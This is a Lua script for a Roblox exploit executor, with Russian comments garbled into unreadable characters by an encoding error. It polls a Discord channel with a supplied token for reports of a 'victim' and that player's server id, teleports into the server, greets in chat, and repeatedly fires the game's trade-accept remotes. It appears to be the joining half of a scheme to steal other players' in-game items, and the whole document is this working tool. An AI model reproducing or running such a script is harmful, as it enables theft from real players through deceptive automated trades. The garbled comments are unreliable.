-- –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
local checkInterval = 5 -- –ò–Ω—Ç–µ—Ä–≤–∞–ª –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π (—Å–µ–∫—É–Ω–¥—ã)

-- –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
if not game:IsLoaded() then game.Loaded:Wait() end
print("‚úÖ –°–∫—Ä–∏–ø—Ç –∑–∞–ø—É—â–µ–Ω")

-- –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–∞ –∏ –∫–∞–Ω–∞–ª–∞
if token == "" or channelId == "" then
    game.Players.LocalPlayer:Kick("‚ùå –£–∫–∞–∂–∏—Ç–µ —Ç–æ–∫–µ–Ω –∏ channelId!")
    return
end

-- –°–µ—Ä–≤–∏—Å—ã
local HttpService = game:GetService("HttpService")
local VirtualUser = game:GetService("VirtualUser")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Anti-AFK
Players.LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

-- –§–∞–π–ª—ã –¥–∞–Ω–Ω—ã—Ö
if not isfile("joined_ids.txt") then writefile("joined_ids.txt", "[]") end
local joinedIds = HttpService:JSONDecode(readfile("joined_ids.txt"))

-- –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è
local lastMessageId = nil
local currentVictim = nil
local isTeleporting = false
local victimLeft = false

-- –§—É–Ω–∫—Ü–∏—è –≤—ã–±–æ—Ä–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
local function selectDevice()
    while task.wait(0.1) do
        local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
        if DeviceSelectGui then
            local Container = DeviceSelectGui:WaitForChild("Container")
            local Mouse = game.Players.LocalPlayer:GetMouse()
            local button = Container:WaitForChild("Phone"):WaitForChild("Button")
            local buttonPos = button.AbsolutePosition
            local buttonSize = button.AbsoluteSize
            local centerX = buttonPos.X + buttonSize.X / 2
            local centerY = buttonPos.Y + buttonSize.Y / 2
            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
        end
    end
end

-- –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ —á–∞—Ç
local function sendChatMessage()
    task.wait(3)
    pcall(function()
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("hi")
        print("üí¨ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ")
    end)
end

-- –ê–≤—Ç–æ–ø—Ä–∏–Ω—è—Ç–∏–µ —Ç—Ä–µ–π–¥–æ–≤
local function acceptRequest()
    while task.wait(0.1) do
        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest'):FireServer()
    end
end

local function acceptTrade()
    while task.wait(0.1) do
        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
    end
end

-- –ü–æ–∏—Å–∫ –∫–æ–º–∞–Ω–¥—ã —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏
local function findTeleportCommand(content)
    if not content then return nil, nil end
    
    local patterns = {
        'TeleportService%s*:%s*TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']',
        'game%s*[:%.]%s*GetService%s*%(%s*["\']TeleportService["\']%s*%)%s*:%s*TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']'
    }
    
    for _, pattern in ipairs(patterns) do
        local placeId, jobId = content:match(pattern)
        if placeId and jobId then return placeId, jobId end
    end
    
    return nil, nil
end

-- –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–º–µ–Ω–∏ –∂–µ—Ä—Ç–≤—ã –∏–∑ embed
local function getVictimFromEmbed(embed)
    if not embed or not embed.fields then return nil end
    
    for _, field in ipairs(embed.fields) do
        if field.name and field.name:find("User information") and field.value then
            local username = field.value:match("Username%s*:%s*(.-)\n")
            return username and username:gsub("%s+$", "") or nil
        end
    end
    
    return nil
end

-- –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–æ–≤—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π –≤ Discord
local function checkNewMessages()
    local params = "?limit=10"
    if lastMessageId then
        params = params .. "&after=" .. lastMessageId
    end

    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages"..params,
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['Content-Type'] = 'application/json'
        }
    })

    if not response.Success then
        warn("‚ùå –û—à–∏–±–∫–∞ Discord:", response.StatusCode)
        return false
    end

    local messages = HttpService:JSONDecode(response.Body)
    if #messages == 0 then return false end

    -- –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç –Ω–æ–≤—ã—Ö –∫ —Å—Ç–∞—Ä—ã–º
    for i = #messages, 1, -1 do
        local msg = messages[i]
        
        if msg.content and msg.embeds and #msg.embeds > 0 then
            -- –û–±–Ω–æ–≤–ª—è–µ–º ID –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
            if not lastMessageId or msg.id > lastMessageId then
                lastMessageId = msg.id
            end

            -- –ü–æ–ª—É—á–∞–µ–º –∏–º—è –∂–µ—Ä—Ç–≤—ã –∏–∑ embed
            currentVictim = getVictimFromEmbed(msg.embeds[1])
            if not currentVictim then
                print("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–º—è –∂–µ—Ä—Ç–≤—ã –∏–∑ embed")
                currentVictim = "unknown"
            else
                print("üéØ –¶–µ–ª—å:", currentVictim)
            end
            
            local placeId, jobId = findTeleportCommand(msg.content)
            if placeId and jobId then
                print("üéØ –ù–∞–π–¥–µ–Ω —Å–µ—Ä–≤–µ—Ä:", placeId, jobId)
                
                if not table.find(joinedIds, msg.id) then
                    table.insert(joinedIds, msg.id)
                    writefile("joined_ids.txt", HttpService:JSONEncode(joinedIds))
                    
                    print("üöÄ –¢–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏—è...")
                    isTeleporting = true
                    local success = pcall(function()
                        TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId)
                    end)
                    
                    if success then
                        return true
                    else
                        isTeleporting = false
                        warn("‚ùå –û—à–∏–±–∫–∞ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏")
                    end
                else
                    print("‚ö†Ô∏è –£–∂–µ –≤—Å—Ç—É–ø–∞–ª–∏")
                end
            end
        end
    end
    
    return false
end

-- –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –≤—ã—Ö–æ–¥–∞ —Ü–µ–ª–∏
Players.PlayerRemoving:Connect(function(player)
    if currentVictim and player.Name == currentVictim then
        victimLeft = true
        print("üéØ –¶–µ–ª—å –≤—ã—à–ª–∞:", currentVictim)
    end
end)

-- –ó–∞–ø—É—Å–∫ —Ñ—É–Ω–∫—Ü–∏–π
task.spawn(selectDevice)
task.spawn(sendChatMessage)
task.spawn(acceptRequest)
task.spawn(acceptTrade)

-- –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª
while task.wait(checkInterval) do
    if not isTeleporting then
        if victimLeft then
            print("üîÑ –û–∂–∏–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–π —Ü–µ–ª–∏...")
            victimLeft = false
            currentVictim = nil
        else
            pcall(checkNewMessages)
        end
    end
end
